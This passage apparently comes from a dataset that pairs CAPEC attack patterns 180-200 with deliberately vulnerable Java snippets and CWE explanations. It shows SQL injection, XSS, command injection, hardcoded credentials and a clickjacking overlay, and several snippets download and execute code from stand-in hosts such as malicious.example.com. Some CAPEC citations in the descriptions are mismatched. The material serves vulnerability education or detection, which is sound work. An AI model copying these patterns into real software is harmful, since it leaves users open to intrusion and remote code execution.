        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Cookie;\n\n@WebServlet(\"/microservice\")\npublic class MicroserviceServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Sensitive information in query string\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-539: Use of persistent cookies containing sensitive information\n        Cookie cookie = new Cookie(\"sessionID\", sensitiveData);\n        cookie.setMaxAge(60 * 60 * 24 * 7); // 1 week\n        response.addCookie(cookie);\n        \n        // CWE-219: Storing sensitive data under web root\n        String filePath = getServletContext().getRealPath(\"/sensitiveData.txt\");\n        java.nio.file.Files.write(java.nio.file.Paths.get(filePath), sensitiveData.getBytes());\n        \n        // CWE-433: Unparsed raw web content delivery\n        response.setContentType(\"text/plain\");\n        response.getWriter().write(sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly'. The servlet exposes a microservice endpoint '/microservice' that processes sensitive data in an insecure manner. It includes the following vulnerabilities:\n\n1. CWE-598: The servlet retrieves sensitive information from the query string, which can be easily intercepted.\n2. CWE-539: The servlet stores sensitive information in a persistent cookie, which can be accessed by unauthorized parties if the cookie is stolen.\n3. CWE-219: The servlet writes sensitive data to a file under the web root directory, making it accessible to untrusted parties.\n4. CWE-433: The servlet delivers raw content without parsing, which can expose sensitive information directly to the client.\n\nThis code represents the main idea of the CAPEC by showing how an attacker could discover and exploit microservices that are improperly secured, leading to potential data exposure and further exploitation."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class AccessControlMisconfiguration {\n    public static void main(String[] args) {\n        // Incorrectly configured access control: granting write access to all users\n        File file = new File(\"/path/to/critical/resource.txt\");\n        try {\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            file.setReadable(true, false); // Allow read access to everyone\n            file.setWritable(true, false); // Allow write access to everyone\n\n            // Writing sensitive data to the file\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"Sensitive Information\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misconfiguration of access control, which is the main idea of the CAPEC. The code creates a file and sets its permissions to be readable and writable by all users, which is an example of CWE-732: Incorrect Permission Assignment for Critical Resource. This misconfiguration allows unauthorized users to read and modify the sensitive information stored in the file, thereby bypassing intended access controls and leading to potential security breaches."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class FlashOverlayServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: Embedding a Flash file as a transparent overlay\n        out.println(\"<html>\");\n        out.println(\"<head><title>Flash Overlay Example</title></head>\");\n        out.println(\"<body>\");\n        out.println(\"<div style='position:relative;'>\");\n        out.println(\"<iframe src='https://trusted-site.com' style='width:100%; height:100%;'></iframe>\");\n        out.println(\"<embed src='malicious-overlay.swf' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;' allowscriptaccess='always'></embed>\");\n        out.println(\"</div>\");\n        out.println(\"</body>\");\n        out.println(\"</html>\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerable implementation of a Flash file overlay, which can be used for a clickjacking attack. The servlet generates an HTML page that includes an iframe pointing to a trusted site and an embedded Flash file ('malicious-overlay.swf') with full transparency (opacity:0). The Flash file is positioned over the iframe, intercepting user actions intended for the underlying content. This example also touches on related CWEs: the iframe and Flash file are not properly restricted (CWE-1021), the Flash file could be from an untrusted domain (CWE-942), and the Flash file itself could be a dangerous type (CWE-434)."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashUrl = request.getParameter(\"flashUrl\");\n        if (flashUrl != null && !flashUrl.isEmpty()) {\n            // CWE-20: Improper Input Validation\n            if (!flashUrl.matches(\"^https?://trusted-domain.com/.*\")) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid flash URL\");\n                return;\n            }\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            response.setContentType(\"application/x-shockwave-flash\");\n            response.getWriter().write(\"<embed src='\" + flashUrl + \"'></embed>\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing flash URL\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential Flash Injection vulnerability. The servlet processes a 'flashUrl' parameter from an HTTP GET request. If the 'flashUrl' parameter is provided, it checks if the URL matches a trusted domain using a regular expression. If the URL is not from a trusted domain, it returns a bad request error. Otherwise, it sets the content type to 'application/x-shockwave-flash' and embeds the flash content in the response. This example highlights CWE-20 (Improper Input Validation) by not thoroughly validating the input URL, and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by potentially allowing untrusted domains to be embedded. The code snippet represents the main idea of the CAPEC by showing how an attacker could trick a victim into executing malicious flash content through improper input validation and permissive cross-domain policies."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableMailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userEmail = request.getParameter(\"email\");\n        String imapCommand = \"FETCH 1 BODY[TEXT]\";\n        \n        // Vulnerable: Directly using user input in a command without proper sanitization\n        String command = \"curl -u \" + userEmail + \"@example.com:password imap://mail.example.com/\" + imapCommand;\n        \n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.getWriter().println(\"Error executing command: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where user input is directly used to construct a command that is executed on the server. The 'userEmail' parameter from the HTTP request is concatenated into an IMAP command without proper sanitization or validation, leading to a potential command injection vulnerability (CWE-77). The code also improperly handles error messages by exposing them to the client (CWE-535, CWE-209). This snippet embodies the main idea of the CAPEC by showing how an attacker could exploit weaknesses in input validation to execute arbitrary commands on an IMAP/SMTP server through a web-mail server."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-code.jar\";\n        try {\n            downloadAndExecute(url);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadAndExecute(String url) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {\n        URL website = new URL(url);\n        InputStream in = website.openStream();\n        FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n        byte[] buffer = new byte[1024];\n        int length;\n        while ((length = in.read(buffer)) != -1) {\n            fos.write(buffer, 0, length);\n        }\n        fos.close();\n        in.close();\n\n        // Load and execute the downloaded code without integrity check\n        URL[] urls = { new URL(\"file:downloaded.jar\") };\n        URLClassLoader classLoader = new URLClassLoader(urls);\n        Class<?> clazz = classLoader.loadClass(\"MaliciousClass\");\n        clazz.newInstance();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of a 'Software Integrity Attack' as described in the CAPEC. The code downloads a JAR file from a remote location and executes it without performing any integrity checks to verify the origin or integrity of the code. This is a direct example of CWE-494 (Download of Code Without Integrity Check). The downloaded code could potentially contain malicious code (CWE-506), which could compromise the system's integrity. The code snippet highlights the risk of executing unverified code, which can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) {\n        String url = \"http://malicious.example.com/malware.exe\";\n        String fileName = \"malware.exe\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that downloads and executes a file from a remote location without verifying its integrity or origin. The `downloadFile` method downloads a file from a specified URL and saves it locally. The `executeFile` method then executes the downloaded file. This code embodies the CAPEC 'Malicious Software Download' by illustrating how an attacker could use deceptive methods to cause a user or an automated process to download and execute dangerous code. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded file's integrity or origin, CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) are implied by the potential for the downloaded file to contain hidden malicious functionality, and CWE-509 (Replicating Malicious Code) is suggested by the possibility of the downloaded file being a virus or worm that could replicate and spread."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the supposed update\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            InputStream in = connection.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Load and execute the downloaded update\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a program downloads and executes a software update from a remote URL without verifying its integrity or origin. The code opens a connection to a specified URL, downloads the content to a file named 'update.jar', and then executes this file. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or system into downloading and running malicious code. The code is vulnerable to CWE-494 (Download of Code Without Integrity Check) as it does not verify the downloaded file's authenticity, potentially allowing CWE-506 (Embedded Malicious Code) or CWE-507 (Trojan Horse) to be executed."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdater {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded update\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The program downloads an update from a specified URL and executes it without performing any integrity checks or authentication. This embodies the main idea of CAPEC-139: 'Malicious Automated Software Update via Redirection'. The code is vulnerable to CWE-494: 'Download of Code Without Integrity Check', as it does not verify the origin or integrity of the downloaded code. An attacker could exploit this by redirecting the update URL to a malicious server, which could then provide a malicious update. The code also implicitly touches on CWE-807: 'Reliance on Untrusted Inputs in a Security Decision', as it trusts the URL input without validation."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import java.security.Key;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class VulnerableEncryption {\n    private static final String ALGORITHM = \"DES\"; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static final byte[] KEY = \"12345678\".getBytes(); // Hardcoded key, vulnerable to reverse engineering\n\n    public static String encrypt(String data) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedData);\n    }\n\n    public static String decrypt(String encryptedData) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.DECRYPT_MODE, key);\n        byte[] decodedData = Base64.getDecoder().decode(encryptedData);\n        byte[] decryptedData = cipher.doFinal(decodedData);\n        return new String(decryptedData);\n    }\n\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Information\";\n        String encryptedData = encrypt(data);\n        System.out.println(\"Encrypted: \" + encryptedData);\n        String decryptedData = decrypt(encryptedData);\n        System.out.println(\"Decrypted: \" + decryptedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable encryption mechanism that embodies the main idea of reverse engineering (CAPEC-REV-ENG). The code uses the DES algorithm (CWE-327: Use of a Broken or Risky Cryptographic Algorithm), which is considered weak and susceptible to attacks. Additionally, the encryption key is hardcoded in the source code, making it easy for an attacker to reverse engineer the application and retrieve the key (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This example highlights how improper cryptographic practices and hardcoded keys can lead to vulnerabilities that can be exploited through reverse engineering techniques."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.Arrays;\n\npublic class SensitiveOperation {\n    private static final byte[] SECRET_KEY = new byte[16];\n    private static final SecureRandom RANDOM = new SecureRandom();\n\n    static {\n        RANDOM.nextBytes(SECRET_KEY);\n    }\n\n    public boolean authenticate(byte[] inputKey) {\n        // Vulnerable comparison logic\n        for (int i = 0; i < SECRET_KEY.length; i++) {\n            if (SECRET_KEY[i] != inputKey[i]) {\n                return false; // Observable discrepancy\n            }\n        }\n        return true;\n    }\n\n    public static void main(String[] args) {\n        SensitiveOperation op = new SensitiveOperation();\n        byte[] testKey = new byte[16];\n        RANDOM.nextBytes(testKey);\n        System.out.println(\"Authentication result: \" + op.authenticate(testKey));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication mechanism that embodies the concept of 'Black Box Reverse Engineering' (CAPEC-170). The `authenticate` method compares an input key with a secret key byte-by-byte. If any byte does not match, it returns false immediately, creating an observable discrepancy (CWE-203). This discrepancy can be exploited by an attacker to reverse-engineer the secret key through timing analysis or power side-channel attacks (CWE-1255, CWE-1300). The code also implicitly exposes sensitive system information (CWE-497) by revealing whether the authentication was successful or not. The main idea is to show how improper handling of sensitive operations can lead to vulnerabilities exploitable through black box analysis techniques."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-code.jar\";\n        String fileName = \"downloaded.jar\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(\"java -jar \" + fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of the CAPEC 'Reverse Engineer an Executable to Expose Assumed Hidden Functionality'. The code downloads a JAR file from a remote location and executes it without performing any integrity checks, which is related to CWE-494 (Download of Code Without Integrity Check). This can lead to the execution of malicious code (CWE-506) and potentially expose sensitive system information (CWE-497). The hidden functionality in the downloaded code (CWE-912) can be reverse-engineered by an attacker to understand and exploit the system further."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class SensitiveDataExample {\n    // CWE-798: Hard-coded credentials\n    private static final String HARD_CODED_PASSWORD = \"P@ssw0rd123\";\n\n    // CWE-547: Hard-coded security-relevant constant\n    private static final String SECRET_KEY = \"s3cr3tK3y\";\n\n    public static void main(String[] args) {\n        // CWE-318: Cleartext storage of sensitive information in executable\n        System.out.println(\"Using hard-coded password: \" + HARD_CODED_PASSWORD);\n        System.out.println(\"Using hard-coded secret key: \" + SECRET_KEY);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive information directly within the source code. The constants `HARD_CODED_PASSWORD` and `SECRET_KEY` are examples of CWE-798 and CWE-547, respectively, where sensitive credentials and security-relevant constants are hard-coded. The `main` method prints these sensitive values, illustrating CWE-318 by storing and displaying sensitive information in cleartext. This code is vulnerable to static and dynamic analysis techniques that can easily extract these hard-coded values, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class VulnerableProtocol {\n    private static final String ALGORITHM = \"AES\";\n    private static final String TRANSFORMATION = \"AES/ECB/PKCS5Padding\";\n    private static final String SECRET_KEY = \"1234567890123456\"; // Weak key\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            Socket clientSocket = serverSocket.accept();\n            DataInputStream dis = new DataInputStream(clientSocket.getInputStream());\n            String encryptedMessage = dis.readUTF();\n            String decryptedMessage = decrypt(encryptedMessage, SECRET_KEY);\n            System.out.println(\"Decrypted message: \" + decryptedMessage);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String decrypt(String strToDecrypt, String secret) {\n        try {\n            SecretKeySpec secretKey = new SecretKeySpec(secret.getBytes(), ALGORITHM);\n            Cipher cipher = Cipher.getInstance(TRANSFORMATION);\n            cipher.init(Cipher.DECRYPT_MODE, secretKey);\n            return new String(cipher.doFinal(java.util.Base64.getDecoder().decode(strToDecrypt)));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol implementation that embodies the main idea of CAPEC-272 (Protocol Analysis). The code sets up a server that listens for incoming connections and decrypts received messages using a weak encryption key. The following CWEs are represented:\n\n1. CWE-326 (Inadequate Encryption Strength): The encryption key '1234567890123456' is weak and easily guessable.\n2. CWE-319 (Cleartext Transmission of Sensitive Information): The server reads the encrypted message in cleartext over the network, which can be intercepted by unauthorized actors.\n3. CWE-757 (Selection of Less-Secure Algorithm During Negotiation): The code uses a fixed, less-secure algorithm (AES/ECB/PKCS5Padding) without negotiating a stronger option.\n4. CWE-188 (Reliance on Data/Memory Layout): The code assumes a specific layout for the encrypted data, which can lead to unintended behavior if the data format changes.\n\nThe code highlights the risks associated with weak encryption, cleartext transmission, and poor algorithm selection, making it susceptible to protocol analysis attacks."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        if (fileName != null) {\n            File file = new File(\"/var/www/html/\" + fileName);\n            if (file.exists() && !file.isDirectory()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The servlet reads a file name from a request parameter and attempts to read and output the file's contents. The code does not properly sanitize the input, allowing an attacker to specify any file path. This can lead to directory traversal attacks, where an attacker can access sensitive files on the server. Additionally, if the file contains executable code, it could be executed, leading to remote code execution. This example also touches on CWE-98 (Improper Control of Filename for Include/Require Statement), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String message = input.readLine();\n\n                // Improper Authentication: No verification of the sender's identity\n                System.out.println(\"Received message: \" + message);\n\n                // Process the message without verifying its source\n                if (message.startsWith(\"ADMIN:\")) {\n                    System.out.println(\"Performing admin action...\");\n                } else {\n                    System.out.println(\"Performing user action...\");\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. When a message is received, it processes the message without verifying the sender's identity, embodying the 'Fake the Source of Data' CAPEC. The server reads the message and performs actions based on the message content, assuming the sender's identity based on the message prefix (e.g., 'ADMIN:'). This demonstrates CWE-287 (Improper Authentication) and CWE-940 (Improper Verification of Source of a Communication Channel), as the server does not authenticate the sender or verify the source of the communication, allowing an attacker to spoof messages and potentially escalate privileges or manipulate data."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import java.util.Scanner;\n\npublic class PrincipalSpoofExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        // Simulate a weak authentication mechanism\n        if (authenticate(username, password)) {\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Weak authentication: simply checks if username is 'admin' and password is 'password'\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism that is vulnerable to a Principal Spoof attack. The code prompts the user to enter a username and password, and then performs a simple authentication check. The authentication mechanism is weak because it only checks if the username is 'admin' and the password is 'password', without any additional verification. This can be easily spoofed by an attacker who knows or guesses these credentials. The code embodies the main idea of CAPEC-151 (Principal Spoof) and highlights related weaknesses such as CWE-290 (Authentication Bypass by Spoofing) and CWE-1390 (Weak Authentication)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SessionManager {\n    private static Map<String, String> sessionStore = new HashMap<>();\n    private static final String SECRET_KEY = \"defaultSecretKey\"; // CWE-1391: Use of Weak Credentials\n\n    public static String createSession(String username) {\n        String sessionId = Base64.getEncoder().encodeToString((username + SECRET_KEY).getBytes());\n        sessionStore.put(sessionId, username);\n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        return sessionStore.containsKey(sessionId);\n    }\n\n    public static void main(String[] args) {\n        String sessionId = createSession(\"user1\");\n        System.out.println(\"Session ID: \" + sessionId);\n\n        // Attacker forges a session ID\n        String forgedSessionId = Base64.getEncoder().encodeToString((\"attacker\" + SECRET_KEY).getBytes());\n        System.out.println(\"Forged Session ID: \" + forgedSessionId);\n\n        // Validate forged session\n        if (validateSession(forgedSessionId)) {\n            System.out.println(\"Forged session is valid!\");\n        } else {\n            System.out.println(\"Forged session is invalid!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session management system that embodies the main idea of CAPEC-61: Session Credential Falsification through Forging. The code uses a weak secret key (CWE-1391) to generate session IDs by encoding the username concatenated with the secret key using Base64. This approach allows an attacker to forge a valid session ID by knowing or guessing the secret key. The `createSession` method generates a session ID for a given username, and the `validateSession` method checks if a session ID exists in the session store. The `main` method demonstrates how an attacker can forge a session ID and potentially gain unauthorized access. The code also highlights the use of weak credentials and improper session management practices, making it susceptible to session fixation (CWE-384) and insufficient session expiration (CWE-613)."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ExponentialDataExpansion {\n    public static void main(String[] args) {\n        // Create a map to simulate nested data structures\n        Map<String, Object> data = new HashMap<>();\n        createNestedData(data, 0);\n    }\n\n    private static void createNestedData(Map<String, Object> data, int depth) {\n        if (depth > 10) { // Arbitrary depth limit to prevent infinite recursion\n            return;\n        }\n        Map<String, Object> nestedData = new HashMap<>();\n        data.put(\"nested\" + depth, nestedData);\n        createNestedData(nestedData, depth + 1);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of Exponential Data Expansion by recursively creating nested data structures. The `createNestedData` method adds a new nested map at each level of recursion, simulating the creation of complex and deeply nested data structures. The depth limit is set to 10 to prevent infinite recursion, but in a real-world scenario, the absence of such a limit could lead to excessive memory and CPU usage, embodying the main idea of CAPEC-230. The related CWEs are represented by the recursive creation of nested data structures (CWE-776), the potential for excessive resource allocation (CWE-770), and the complexity of the data representation (CWE-1093)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String errorMessage = request.getParameter(\"error\");\n        if (errorMessage == null) {\n            errorMessage = \"Unknown error occurred.\";\n        }\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Error Page</h1>\");\n        response.getWriter().println(\"<p>\" + errorMessage + \"</p>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of an error page that is susceptible to Cross-Site Scripting (XSS) attacks. The servlet retrieves an 'error' parameter from the HTTP request and directly includes it in the HTML response without proper neutralization. This can lead to XSS if an attacker crafts a URL with a malicious script in the 'error' parameter. The code embodies the main idea of CAPEC-86 (XSS Targeting Error Pages) and is related to several CWEs, including CWE-81, CWE-79, and CWE-80, which describe improper neutralization of script elements in web pages."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) attacks using alternate syntax. The servlet takes user input from a request parameter and directly includes it in the HTML response without proper sanitization or neutralization. This allows an attacker to inject malicious scripts using alternate forms of script tags (e.g., 'ScRiPt' instead of 'script') or other special characters that may bypass incomplete denylist-based filters. The code highlights the risks associated with improper neutralization of user input and the potential for XSS attacks when relying on inadequate filtering mechanisms."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import java.sql.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // Vulnerable: No input validation or filtering\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        \n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(query)) {\n            while (rs.next()) {\n                response.getWriter().println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
